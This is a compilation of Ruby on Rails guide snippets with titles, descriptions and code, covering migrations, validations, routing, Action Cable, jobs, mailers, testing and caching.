db:setup:primary                   # Create the primary database, loads the schema, and initializes with the seed data (use db:reset:primary to also drop the database first)
...

----------------------------------------

TITLE: Migration with NOT NULL Constraint
DESCRIPTION: Migration file that adds an email column with a NOT NULL constraint to the users table, generated using the ! shortcut in the generator command.

LANGUAGE: ruby
CODE:
class AddEmailToUsers < ActiveRecord::Migration[8.1]
  def change
    add_column :users, :email, :string, null: false
  end
end

----------------------------------------

TITLE: Demonstrating SQL Query Caching in Rails Controllers
DESCRIPTION: This example demonstrates SQL query caching in a Rails controller. When the same query is executed twice in the same action, Rails uses the cached result set from the first query instead of hitting the database again.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
    # Run a find query
    @products = Product.all

    # ...

    # Run the same query again
    @products = Product.all
  end
end

----------------------------------------

TITLE: Using Beginless Ranges with Exclusion Validators in Active Model
DESCRIPTION: Example showing how to use beginless ranges with exclusivity validators. This allows validating that a value falls outside a range with only an upper bound defined.

LANGUAGE: ruby
CODE:
validates_exclusion_of :birth_date, in: -> { (..Date.today) }

----------------------------------------

TITLE: Using head Method for Header-Only Responses in Rails
DESCRIPTION: Examples of using the head method to send responses with only HTTP headers and no body, useful for responding with just status codes or specific headers.

LANGUAGE: ruby
CODE:
head :bad_request

LANGUAGE: http
CODE:
HTTP/1.1 400 Bad Request
Connection: close
Date: Sun, 24 Jan 2010 12:15:53 GMT
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
X-Runtime: 0.013483
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache

LANGUAGE: ruby
CODE:
head :created, location: photo_path(@photo)

LANGUAGE: http
CODE:
HTTP/1.1 201 Created
Connection: close
Date: Sun, 24 Jan 2010 12:16:44 GMT
Transfer-Encoding: chunked
Location: /photos/1
Content-Type: text/html; charset=utf-8
X-Runtime: 0.083496
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache

----------------------------------------

TITLE: Creating Tables with Composite Primary Keys in Rails Migrations
DESCRIPTION: Uses the :primary_key option with create_table to define a composite primary key consisting of store_id and sku columns.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products, primary_key: [:store_id, :sku] do |t|
      t.integer :store_id
      t.string :sku
      t.text :description
    end
  end
end

----------------------------------------

TITLE: Starting the Rails Server
DESCRIPTION: Command to start the Rails development server (Puma), which will serve the application on localhost:3000.

LANGUAGE: bash
CODE:
$ bin/rails server

----------------------------------------

TITLE: Configuring Default URL Options for Action Mailer in Rails
DESCRIPTION: Sets the default URL options for Action Mailer across the application by configuring the host in the application.rb file. This is required because mailer instances don't have context about incoming requests.

LANGUAGE: ruby
CODE:
config.action_mailer.default_url_options = { host: "example.com" }

----------------------------------------

TITLE: Filtering Errors by Class in Rails Error Reporter
DESCRIPTION: Example of filtering errors by class type with Rails.error.handle. Only errors of the specified class (or its descendants) will be captured and reported.

LANGUAGE: ruby
CODE:
Rails.error.handle(IOError) do
  1 + "1" # raises TypeError
end
1 + 1 # TypeErrors are not IOErrors, so this will *not* be executed

----------------------------------------

TITLE: Generated Add Column with Index Migration in Ruby on Rails
DESCRIPTION: This migration adds a part_number string column to products and creates an index on that column. It demonstrates how Rails handles the :index suffix in the generator command.

LANGUAGE: ruby
CODE:
class AddPartNumberToProducts < ActiveRecord::Migration[8.1]
  def change
    add_column :products, :part_number, :string
    add_index :products, :part_number
  end
end

----------------------------------------

TITLE: Auto-generated Migration for Creating Products Table
DESCRIPTION: Migration file generated by the model generator command that creates a products table with name and description columns, along with timestamps for created_at and updated_at.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products do |t|
      t.string :name
      t.text :description

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Rolling Back the Latest Migration with Command Line
DESCRIPTION: Command to roll back the most recent migration, useful for correcting mistakes in the latest migration without needing to specify the version number.

LANGUAGE: bash
CODE:
$ bin/rails db:rollback

----------------------------------------

TITLE: Defining Custom Validation Contexts in Ruby on Rails
DESCRIPTION: This code demonstrates how to define custom validation contexts for different steps of a multi-step form. Each validation method handles a specific group of fields, allowing for step-by-step validation.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validate :personal_information, on: :personal_info
  validate :contact_information, on: :contact_info
  validate :location_information, on: :location_info

  private
    def personal_information
      errors.add(:base, "Name must be present") if first_name.blank?
      errors.add(:base, "Age must be at least 18") if age && age < 18
    end

    def contact_information
      errors.add(:base, "Email must be present") if email.blank?
      errors.add(:base, "Phone number must be present") if phone.blank?
    end

    def location_information
      errors.add(:base, "Address must be present") if address.blank?
      errors.add(:base, "City must be present") if city.blank?
    end
end

----------------------------------------

TITLE: Halting Destroy Operations with throw :abort
DESCRIPTION: Demonstrates using throw :abort in before_destroy callbacks to conditionally prevent record deletion. This approach causes destroy to return false when the callback aborts the operation.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  before_destroy do
    throw :abort if still_active?
  end
end

User.first.destroy # => false

----------------------------------------

TITLE: Testing View Partials with DOM Assertions in Rails
DESCRIPTION: Demonstrates using DOM assertions to test view partials in Rails. This extends the previous example by using assert_dom to make more specific assertions about the rendered HTML structure.

LANGUAGE: ruby
CODE:
test "renders a link to itself" do
  article = Article.create! title: "Hello, world"

  render "articles/article", article: article

  assert_dom "a[href=?]", article_url(article), text: article.title
end

----------------------------------------

TITLE: Creating Polymorphic Associations with belongs_to in Rails Migrations
DESCRIPTION: Shows how to create a polymorphic association using add_belongs_to (an alias of add_reference). This creates taggable_type and taggable_id columns that can be used for polymorphic associations.

LANGUAGE: ruby
CODE:
add_belongs_to :taggings, :taggable, polymorphic: true

----------------------------------------

TITLE: Dynamic Job Priority Based on Arguments in Rails
DESCRIPTION: Shows how to dynamically set job priority based on arguments by passing a block to queue_with_priority that evaluates in the job context.

LANGUAGE: ruby
CODE:
class ProcessVideoJob < ApplicationJob
  queue_with_priority do
    video = self.arguments.first
    if video.owner.premium?
      0
    else
      10
    end
  end

  def perform(video)
    # Process video
  end
end

----------------------------------------

TITLE: Listing Validators in Rails Console
DESCRIPTION: Shows how to use the validators and validators_on methods to inspect all validators or validators for a specific field. This is useful for debugging validation configurations.

LANGUAGE: ruby
CODE:
irb> Person.validators
#=> [#<ActiveRecord::Validations::PresenceValidator:0x10b2f2158
      @attributes=[:name], @options={:on=>:create}>,
     #<MyOtherValidatorValidator:0x10b2f17d0
      @attributes=[:name], @options={:strict=>true}>,
     #<ActiveModel::Validations::FormatValidator:0x10b2f0f10
      @attributes=[:email],
      @options={:with=>URI::MailTo::EMAIL_REGEXP}>]
     #<MyOtherValidator:0x10b2f0948 @options={:strict=>true}>]

irb> Person.validators_on(:name)
#=> [#<ActiveModel::Validations::PresenceValidator:0x10b2f2158
      @attributes=[:name], @options={on: :create}>]

----------------------------------------

TITLE: Checking If Specific Attribute Changed with _changed? in Rails
DESCRIPTION: Demonstrates the attribute-specific [attr_name]_changed? method which checks if a particular attribute has been changed. Returns true when the attribute has unsaved changes.

LANGUAGE: irb
CODE:
irb> person.first_name_changed?
=> true

----------------------------------------

TITLE: Chaining WHERE Conditions for AND Logic in Rails
DESCRIPTION: Shows how to chain where calls to create AND conditions in queries, finding records that match all specified conditions.

LANGUAGE: ruby
CODE:
Customer.where(last_name: "Smith").where(orders_count: [1, 3, 5])

----------------------------------------

TITLE: Using Nested assert_dom Blocks for Complex HTML Testing
DESCRIPTION: Example of nesting assert_dom calls to test hierarchical HTML structures. The inner assertion runs within the context of elements selected by the outer assertion.

LANGUAGE: ruby
CODE:
assert_dom "ul.navigation" do
  assert_dom "li.menu_item"
end

----------------------------------------

TITLE: Using the shallow Method Block in Rails Routing
DESCRIPTION: Shows how to use the shallow method with a block to create a scope in which all nested resources are shallow. This provides a clean way to group multiple resources that should all use shallow nesting.

LANGUAGE: ruby
CODE:
shallow do
  resources :articles do
    resources :comments
    resources :quotes
  end
end

----------------------------------------

TITLE: Creating an Action Cable Consumer in JavaScript
DESCRIPTION: Client-side JavaScript to establish a WebSocket connection consumer. This creates a consumer that connects to the default `/cable` endpoint and exports it for use by channel subscriptions.

LANGUAGE: javascript
CODE:
// app/javascript/channels/consumer.js
// Action Cable provides the framework to deal with WebSockets in Rails.
// You can generate new channels where WebSocket features live using the `bin/rails generate channel` command.

import { createConsumer } from "@rails/actioncable"

export default createConsumer()

----------------------------------------

TITLE: Using Namespaced Controllers with Resources in Rails Routes
DESCRIPTION: Shows how to route a resource to a controller in a namespace using directory notation. This example routes user_permissions resource paths to the Admin::UserPermissions controller.

LANGUAGE: ruby
CODE:
resources :user_permissions, controller: "admin/user_permissions"

----------------------------------------

TITLE: Ordering Results from Associated Tables in Rails
DESCRIPTION: Demonstrates how to order query results based on fields from joined or included associated tables.

LANGUAGE: ruby
CODE:
Book.includes(:author).order(books: { print_year: :desc }, authors: { name: :asc })
# OR
Book.includes(:author).order("books.print_year desc", "authors.name asc")

----------------------------------------

TITLE: Setting HTTP Status Code in Rails Render
DESCRIPTION: Examples showing how to set custom HTTP status codes when rendering views. The status can be specified as either a numeric code or a symbolic name.

LANGUAGE: ruby
CODE:
render status: 500
render status: :forbidden

----------------------------------------

TITLE: Enabling Encryption for Solid Cache
DESCRIPTION: Configuration for enabling encryption in Solid Cache to protect sensitive cached data. This requires Active Record Encryption to be set up in the application.

LANGUAGE: yaml
CODE:
# config/cache.yml
production:
  encrypt: true

----------------------------------------

TITLE: Configuring System Tests to Use Remote Selenium
DESCRIPTION: This configuration allows system tests to connect to a remote Selenium server, such as one running in Docker. It uses an environment variable to set the remote URL.

LANGUAGE: ruby
CODE:
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  url = ENV.fetch("SELENIUM_REMOTE_URL", nil)
  options = if url
    { browser: :remote, url: url }
  else
    { browser: :chrome }
  end
  driven_by :selenium, using: :headless_chrome, options: options
end

----------------------------------------

TITLE: Querying Changed Attributes with ActiveModel::Dirty in Ruby on Rails
DESCRIPTION: Demonstrates how to check if a model has unsaved changes using the changed? method. This example shows how an object starts as unchanged and becomes changed after attribute modification.

LANGUAGE: irb
CODE:
irb> person.changed?
=> false

irb> person.first_name = "Jane Doe"
irb> person.first_name
=> "Jane Doe"

----------------------------------------

TITLE: Using Proc for Conditional Validation in Rails
DESCRIPTION: Demonstrates how to use a Proc object with the :unless option for conditional validation. This allows for inline validation conditions without defining separate methods.

LANGUAGE: ruby
CODE:
class Account < ApplicationRecord
  validates :password, confirmation: true,
    unless: Proc.new { |a| a.password.blank? }
end

----------------------------------------

TITLE: Using assert_changes for Testing Value Changes in Ruby
DESCRIPTION: Tests that the result of evaluating an expression changes from one value to another after invoking the block.

LANGUAGE: ruby
CODE:
assert_changes(expressions, message = nil, from:, to:, &block)

----------------------------------------

TITLE: Using many? in Ruby on Rails
DESCRIPTION: The many? method is shorthand for collection.size > 1. It can also take an optional block to only consider elements that return true. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: erb
CODE:
<% if pages.many? %>
  <%= pagination_links %>
<% end %>

LANGUAGE: ruby
CODE:
@see_more = videos.many? { |video| video.category == params[:category] }

----------------------------------------

TITLE: Configuring Rails Generators with Ruby
DESCRIPTION: Demonstrates how to customize Rails generators by specifying ORM, test framework, and other generator options. This configuration affects what files are generated when using Rails generator commands.

LANGUAGE: ruby
CODE:
config.generators do |g|
  g.orm :active_record
  g.test_framework :test_unit
end

----------------------------------------

TITLE: Setting Maximum ID for Batch Processing in Rails
DESCRIPTION: Shows how to limit batch processing to records up to a specific maximum ID using the finish option, which stops processing when it reaches the specified ID.

LANGUAGE: ruby
CODE:
Customer.find_in_batches(finish: 7000) do |customers|
  export.add_customers(customers)
end

----------------------------------------

TITLE: Using Partial Layouts in Rails
DESCRIPTION: Shows how to apply layouts specifically to partials in Rails views, separate from the main application layout.

LANGUAGE: erb
CODE:
<%= render partial: "link_area", layout: "graybar" %>

----------------------------------------

TITLE: Rendering Collections in Rails Partials
DESCRIPTION: Shows how to render a collection of objects using partials. Rails automatically determines the appropriate partial to use based on the model name in the collection.

LANGUAGE: html+erb
CODE:
<h1>Products</h1>
<%= render partial: "product", collection: @products %>

LANGUAGE: html+erb
CODE:
<p>Product Name: <%= product.name %></p>

LANGUAGE: html+erb
CODE:
<h1>Products</h1>
<%= render @products %>

LANGUAGE: html+erb
CODE:
<h1>Contacts</h1>
<%= render [customer1, employee1, customer2, employee2] %>

LANGUAGE: html+erb
CODE:
<p>Customer: <%= customer.name %></p>

LANGUAGE: html+erb
CODE:
<p>Employee: <%= employee.name %></p>

LANGUAGE: html+erb
CODE:
<h1>Products</h1>
<%= render(@products) || "There are no products available." %>

----------------------------------------

TITLE: Auto-generated Migration for Creating Products Table
DESCRIPTION: Migration file generated by the model generator command that creates a products table with name and description columns, along with timestamps for created_at and updated_at.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products do |t|
      t.string :name
      t.text :description

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Using Procs for Callbacks in Ruby on Rails
DESCRIPTION: Demonstrates passing a proc to a callback for implementation. The proc receives the user object as a parameter and sets the username to email when username is blank.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation ->(user) { user.username = user.email if user.username.blank? }
end

----------------------------------------

TITLE: Defining Channel Classes in Rails Action Cable
DESCRIPTION: Examples of specific channel implementations that inherit from ApplicationCable::Channel. These channels encapsulate logical units of work for different real-time features like chat functionality and user presence.

LANGUAGE: ruby
CODE:
# app/channels/chat_channel.rb
class ChatChannel < ApplicationCable::Channel
end

LANGUAGE: ruby
CODE:
# app/channels/appearance_channel.rb
class AppearanceChannel < ApplicationCable::Channel
end

----------------------------------------

TITLE: Schema Definition in Ruby on Rails
DESCRIPTION: This schema.rb file shows the database structure resulting from running migrations. It includes the products table with its columns as defined in the migration file.

LANGUAGE: ruby
CODE:
# db/schema.rb
ActiveRecord::Schema[8.1].define(version: 2024_05_02_100843) do
  # These are extensions that must be enabled in order to support this database
  enable_extension "plpgsql"

  create_table "products", force: :cascade do |t|
    t.string "name"
    t.text "description"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
  end
end

----------------------------------------

TITLE: Basic Ruby String Output Example
DESCRIPTION: A simple Ruby expression that outputs 'Hello World' as a string, commonly used in Rails documentation to demonstrate basic output.

LANGUAGE: ruby
CODE:
# => "Hello World"

----------------------------------------

TITLE: Adding Confirmation Dialogs to Links with Turbo
DESCRIPTION: ERB and HTML code demonstrating how to add confirmation dialogs to links using data-turbo-confirm. The example shows a delete link with both method override and confirmation.

LANGUAGE: erb
CODE:
<%= link_to "Delete post", post_path(post), data: { turbo_method: "delete", turbo_confirm: "Are you sure?" } %>

LANGUAGE: html
CODE:
<a href="..." data-turbo-confirm="Are you sure?" data-turbo-method="delete">Delete post</a>

----------------------------------------

TITLE: Formatting Numbers in Human-Readable Form in Ruby on Rails
DESCRIPTION: The to_fs(:human) method formats numbers in human-readable word form, automatically choosing appropriate units (Thousand, Million, Billion, etc.).

LANGUAGE: ruby
CODE:
123.to_fs(:human)               # => "123"
1234.to_fs(:human)              # => "1.23 Thousand"
12345.to_fs(:human)             # => "12.3 Thousand"
1234567.to_fs(:human)           # => "1.23 Million"
1234567890.to_fs(:human)        # => "1.23 Billion"
1234567890123.to_fs(:human)     # => "1.23 Trillion"
1234567890123456.to_fs(:human)  # => "1.23 Quadrillion"

----------------------------------------

TITLE: Implementing Attribute Assignment with ActiveModel::AttributeAssignment
DESCRIPTION: This example shows how to create a Person class with ActiveModel::AttributeAssignment to enable mass assignment of attributes using a hash of attribute names and values.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::AttributeAssignment

  attr_accessor :name, :date_of_birth, :active
end

----------------------------------------

TITLE: Rails Console Commands for Sending Emails
DESCRIPTION: Examples of how to send emails from the Rails console, demonstrating the use of deliver_later to queue an email for asynchronous delivery.

LANGUAGE: irb
CODE:
irb> user = User.first
irb> UserMailer.with(user: user).welcome_email.deliver_later

----------------------------------------

TITLE: Implementing Type Casting with ActiveModel::Attributes in Ruby
DESCRIPTION: This example shows how to create a Person class with ActiveModel::Attributes to define data types, set default values, and handle type casting for attributes without using Active Record.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Attributes

  attribute :name, :string
  attribute :date_of_birth, :date
  attribute :active, :boolean, default: true
end

----------------------------------------

TITLE: Adding Rack CORS Gem to Rails
DESCRIPTION: Adds the rack-cors gem to the application's Gemfile to enable Cross-Origin Resource Sharing (CORS). This is necessary when running Rails as an API with a frontend app on a separate domain.

LANGUAGE: ruby
CODE:
gem "rack-cors"

----------------------------------------

TITLE: Testing Enqueued Parameterized Emails in Rails
DESCRIPTION: Demonstrates testing that a parameterized email is correctly enqueued with both parameters and arguments. This uses the assert_enqueued_email_with assertion to verify both params and args.

LANGUAGE: ruby
CODE:
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.with(all: "good").create_invite("me@example.com", "friend@example.com")

    # Test that the email got enqueued with the correct mailer parameters and arguments
    assert_enqueued_email_with UserMailer, :create_invite,
    params: { all: "good" }, args: ["me@example.com", "friend@example.com"] do
      email.deliver_later
    end
  end
end

----------------------------------------

TITLE: Using URL Helpers in Action Mailer Views (Recommended)
DESCRIPTION: Example of using URL helpers in mailer views, which is recommended as they generate full URLs that will work correctly in email clients regardless of web request context.

LANGUAGE: html+erb
CODE:
<%= link_to 'welcome', welcome_url %>

----------------------------------------

TITLE: Implementing Unique Validations with Encrypted Attributes
DESCRIPTION: Demonstrates how to use uniqueness validations with deterministically encrypted attributes. This approach requires enabling extended queries and can work with options like downcase to manage case sensitivity.

LANGUAGE: ruby
CODE:
class Person
  validates :email_address, uniqueness: true
  encrypts :email_address, deterministic: true, downcase: true
end

----------------------------------------

TITLE: Setting Line Number Breakpoints in Rails with break Command
DESCRIPTION: This snippet demonstrates how to set a breakpoint at a specific line number using the 'b' command in the Rails debugger, and then continue execution until that breakpoint is hit.

LANGUAGE: ruby
CODE:
[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
    20|   end
    21|
    22|   # POST /posts or /posts.json
    23|   def create
    24|     @post = Post.new(post_params)
=>  25|     debugger
    26|
    27|     respond_to do |format|
    28|       if @post.save
    29|         format.html { redirect_to @post, notice: "Post was successfully created." }
=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25
  #1    ActionController::BasicImplicitRender#send_action(method="create", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6
  # and 72 frames (use `bt' command for all frames)
(rdbg) b 28    # break command
#0  BP - Line  /Users/st0012/projects/rails-guide-example/app/controllers/posts_controller.rb:28 (line)

LANGUAGE: ruby
CODE:
(rdbg) c    # continue command
[23, 32] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
    23|   def create
    24|     @post = Post.new(post_params)
    25|     debugger
    26|
    27|     respond_to do |format|
=>  28|       if @post.save
    29|         format.html { redirect_to @post, notice: "Post was successfully created." }
    30|         format.json { render :show, status: :created, location: @post }
    31|       else
    32|         format.html { render :new, status: :unprocessable_entity }
=>#0    block {|format=#<ActionController::MimeResponds::Collec...|} in create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:28
  #1    ActionController::MimeResponds#respond_to(mimes=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/mime_responds.rb:205
  # and 74 frames (use `bt' command for all frames)

Stop by #0  BP - Line  /Users/st0012/projects/rails-guide-example/app/controllers/posts_controller.rb:28 (line)

----------------------------------------

TITLE: Bulk Enqueuing Multiple Job Types in Rails
DESCRIPTION: Demonstrates how to enqueue different types of jobs in a single bulk operation using perform_all_later, which allows for efficient scheduling of diverse job classes.

LANGUAGE: ruby
CODE:
class ExportDataJob < ApplicationJob
  def perform(*args)
    # Export data
  end
end

class NotifyGuestsJob < ApplicationJob
  def perform(*guests)
    # Email guests
  end
end

# Instantiate job instances
cleanup_job = GuestsCleanupJob.new(guest)
export_job = ExportDataJob.new(data)
notify_job = NotifyGuestsJob.new(guest)

# Enqueues job instances from multiple classes at once
ActiveJob.perform_all_later(cleanup_job, export_job, notify_job)

----------------------------------------

TITLE: Using File.atomic_write for Safe File Operations
DESCRIPTION: Demonstrates the File.atomic_write method for safely writing to files in a way that prevents readers from seeing partial content. This method creates a temporary file, writes to it, and then atomically renames it to the target file.

LANGUAGE: ruby
CODE:
File.atomic_write(joined_asset_path) do |cache|
  cache.write(join_asset_file_contents(asset_paths))
end

----------------------------------------

TITLE: Adding Custom Methods to Association Collections in Rails
DESCRIPTION: Shows how to extend a has_many association with a custom finder method using an inline block extension.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books do
    def find_by_book_prefix(book_number)
      find_by(category_id: book_number[0..2])
    end
  end
end

----------------------------------------

TITLE: Finding multiple customers by primary keys in Ruby using Active Record
DESCRIPTION: Example of using the find method with an array of IDs to retrieve multiple customer records with IDs 1 and 10.

LANGUAGE: ruby
CODE:
# Find the customers with primary keys 1 and 10.
irb> customers = Customer.find([1, 10]) # OR Customer.find(1, 10)
=> [#<Customer id: 1, first_name: "Lifo">, #<Customer id: 10, first_name: "Ryan">]

----------------------------------------

TITLE: Combining Conditional Callbacks with :if and :unless in Ruby on Rails
DESCRIPTION: Demonstrates how to combine both :if and :unless conditions in the same callback declaration. The callback only runs when all :if conditions are true and all :unless conditions are false.

LANGUAGE: ruby
CODE:
class Comment < ApplicationRecord
  before_save :filter_content,
    if: -> { forum.parental_control? },
    unless: -> { author.trusted? }
end

----------------------------------------

TITLE: Building a Books Index View with ERB
DESCRIPTION: A complete ERB template for displaying a list of books in a table format, with links to show, edit, and destroy individual books. Uses Rails view helpers for generating links.

LANGUAGE: html+erb
CODE:
<h1>Listing Books</h1>

<table>
  <thead>
    <tr>
      <th>Title</th>
      <th>Content</th>
      <th colspan="3"></th>
    </tr>
  </thead>

  <tbody>
    <% @books.each do |book| %>
      <tr>
        <td><%= book.title %></td>
        <td><%= book.content %></td>
        <td><%= link_to "Show", book %></td>
        <td><%= link_to "Edit", edit_book_path(book) %></td>
        <td><%= link_to "Destroy", book, data: { turbo_method: :delete, turbo_confirm: "Are you sure?" } %></td>
      </tr>
    <% end %>
  </tbody>
</table>

<br>

<%= link_to "New book", new_book_path %>

----------------------------------------

TITLE: Custom Migration Output Example
DESCRIPTION: This shows the output generated by the custom migration with controlled output messages and timing information.

LANGUAGE: text
CODE:
==  CreateProducts: migrating =================================================
-- Created a table
   -> and an index!
-- Waiting for a while
   -> 10.0013s
   -> 250 rows
==  CreateProducts: migrated (10.0054s) =======================================

----------------------------------------

TITLE: Handling Validation Errors in Rails Console
DESCRIPTION: IRB console examples demonstrating how to inspect validation errors on an invalid Active Record object, including error size and error messages.

LANGUAGE: irb
CODE:
irb> person = Person.new
=> #<Person id: nil, name: nil, created_at: nil, updated_at: nil>
irb> person.errors.size
=> 0

irb> person.valid?
=> false
irb> person.errors.objects.first.full_message
=> "Name can't be blank"

irb> person.save
=> false

irb> person.save!
ActiveRecord::RecordInvalid: Validation failed: Name can't be blank

irb> Person.create!
ActiveRecord::RecordInvalid: Validation failed: Name can't be blank

----------------------------------------

TITLE: Adding npm Packages with importmap-rails
DESCRIPTION: Commands and JavaScript code for adding and using npm packages in import map-powered Rails applications. The example shows pinning React packages and importing them in application.js.

LANGUAGE: bash
CODE:
$ bin/importmap pin react react-dom

LANGUAGE: javascript
CODE:
import React from "react"
import ReactDOM from "react-dom"

----------------------------------------

TITLE: Rendering Raw Body Response
DESCRIPTION: Sending raw content back to the browser without setting a specific content type using the :body option to render. The default content type is text/plain.

LANGUAGE: ruby
CODE:
render body: "raw"

----------------------------------------

TITLE: Using to_query with a Custom Object
DESCRIPTION: Demonstrates how to_query creates a key-value pair for a query string using the object's to_param value and properly escaping the result.

LANGUAGE: ruby
CODE:
current_user.to_query("user") # => "user=357-john-smith"

----------------------------------------

TITLE: Setting HTTP Headers and CGI Variables in Tests
DESCRIPTION: Shows how to set custom HTTP headers and CGI variables in controller tests.

LANGUAGE: ruby
CODE:
# setting an HTTP Header
get articles_url, headers: { "Content-Type": "text/plain" } # simulate the request with custom header

# setting a CGI variable
get articles_url, headers: { "HTTP_REFERER": "http://example.com/home" } # simulate the request with custom env variable

----------------------------------------

TITLE: Configuring Solid Cache in Development Environment
DESCRIPTION: Configuration for using Solid Cache in development environment. This requires setting the cache_store in the development.rb configuration file.

LANGUAGE: ruby
CODE:
config.cache_store = :solid_cache_store

----------------------------------------

TITLE: Implementing Job Lifecycle Callbacks in Ruby on Rails
DESCRIPTION: Shows how to implement lifecycle callbacks for an Active Job using method-based callbacks. This example uses around_perform to execute code before and after job performance.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  queue_as :default

  around_perform :around_cleanup

  def perform
    # Do something later
  end

  private
    def around_cleanup
      # Do something before perform
      yield
      # Do something after perform
    end
end

----------------------------------------

TITLE: Using Custom Validation Contexts with valid?
DESCRIPTION: This example shows how to trigger validations for specific contexts using the valid? method. Different contexts can be passed to validate only certain aspects of the model.

LANGUAGE: ruby
CODE:
irb> user = User.new(name: "John Doe", age: 17, email: "jane@example.com", phone: "1234567890", address: "123 Main St")
irb> user.valid?(:personal_info) # => false
irb> user.valid?(:contact_info) # => true
irb> user.valid?(:location_info) # => false

----------------------------------------

TITLE: Testing Welcome Page in Rails Integration Test
DESCRIPTION: A simple integration test that verifies the welcome page is accessible and contains the expected heading. It uses assert_dom to check the HTML content.

LANGUAGE: ruby
CODE:
require "test_helper"

class BlogFlowTest < ActionDispatch::IntegrationTest
  test "can see the welcome page" do
    get "/"
    assert_dom "h1", "Welcome#index"
  end
end

----------------------------------------

TITLE: Handling Received Data in a Channel Subscription in JavaScript
DESCRIPTION: Creates a subscription with methods for handling received data. This code processes incoming chat messages and appends them to the DOM with proper formatting.

LANGUAGE: javascript
CODE:
// app/javascript/channels/chat_channel.js
import consumer from "./consumer"

consumer.subscriptions.create({ channel: "ChatChannel", room: "Best Room" }, {
  received(data) {
    this.appendLine(data)
  },

  appendLine(data) {
    const html = this.createLine(data)
    const element = document.querySelector("[data-chat-room='Best Room']")
    element.insertAdjacentHTML("beforeend", html)
  },

  createLine(data) {
    return `
      <article class="chat-line">
        <span class="speaker">${data["sent_by"]}</span>
        <span class="body">${data["body"]}</span>
      </article>
    `
  }
})

----------------------------------------

TITLE: Empty Migration File Structure in Ruby on Rails
DESCRIPTION: This shows the structure of an empty migration file that was generated by the Rails migration generator. It includes a class that inherits from ActiveRecord::Migration with an empty change method.

LANGUAGE: ruby
CODE:
# db/migrate/20240502101659_add_part_number_to_products.rb
class AddPartNumberToProducts < ActiveRecord::Migration[8.1]
  def change
  end
end

----------------------------------------

TITLE: Implementing ActiveModel::Dirty in Ruby
DESCRIPTION: This code demonstrates how to implement change tracking with ActiveModel::Dirty. The Person class tracks changes to first_name and last_name attributes, providing methods to mark attributes as changed, save changes, reload to clear dirty data, and rollback changes.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Dirty

  attr_reader :first_name, :last_name
  define_attribute_methods :first_name, :last_name

  def initialize
    @first_name = nil
    @last_name = nil
  end

  def first_name=(value)
    first_name_will_change! unless value == @first_name
    @first_name = value
  end

  def last_name=(value)
    last_name_will_change! unless value == @last_name
    @last_name = value
  end

  def save
    # Persist data - clears dirty data and moves `changes` to `previous_changes`.
    changes_applied
  end

  def reload!
    # Clears all dirty data: current changes and previous changes.
    clear_changes_information
  end

  def rollback!
    # Restores all previous data of the provided attributes.
    restore_attributes
  end
end

----------------------------------------

TITLE: Using fresh_when Helper for Conditional GET in Rails Controller
DESCRIPTION: Implements HTTP conditional GET support using the fresh_when helper method. This method automatically sends a 304 Not Modified response if the request is fresh, handling the caching logic with less code.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  # This will automatically send back a :not_modified if the request is fresh,
  # and will render the default template (product.*) if it's stale.

  def show
    @product = Product.find(params[:id])
    fresh_when last_modified: @product.published_at.utc, etag: @product
  end
end

----------------------------------------

TITLE: Opening Production Rails Console with Kamal
DESCRIPTION: Command to access the Rails console in the production environment using Kamal.

LANGUAGE: bash
CODE:
$ bin/kamal console

----------------------------------------

TITLE: Using weeks_ago and weeks_since with Date objects in Ruby on Rails
DESCRIPTION: Examples of using weeks_ago and weeks_since methods to navigate backward and forward in time by weeks.

LANGUAGE: ruby
CODE:
Date.new(2010, 5, 24).weeks_ago(1)   # => Mon, 17 May 2010
Date.new(2010, 5, 24).weeks_since(2) # => Mon, 07 Jun 2010

----------------------------------------

TITLE: Various Methods for Rendering the Edit Template
DESCRIPTION: Different syntaxes for rendering the edit template in BooksController, all of which are equivalent and render the same template file.

LANGUAGE: ruby
CODE:
render :edit
render action: :edit
render "edit"
render action: "edit"
render "books/edit"
render template: "books/edit"

----------------------------------------

TITLE: Suppressing Exceptions with suppress
DESCRIPTION: Shows how to use the suppress method to catch and ignore specific exception types during a block execution.

LANGUAGE: ruby
CODE:
# If the user is locked, the increment is lost, no big deal.
suppress(ActiveRecord::StaleObjectError) do
  current_user.increment! :visits
end

----------------------------------------

TITLE: Enabling Client-side Logging for Action Cable in JavaScript
DESCRIPTION: JavaScript code to enable client-side logging for Action Cable. This helps with debugging client-side connection and subscription issues in the browser console.

LANGUAGE: javascript
CODE:
import * as ActionCable from '@rails/actioncable'

ActionCable.logger.enabled = true

----------------------------------------

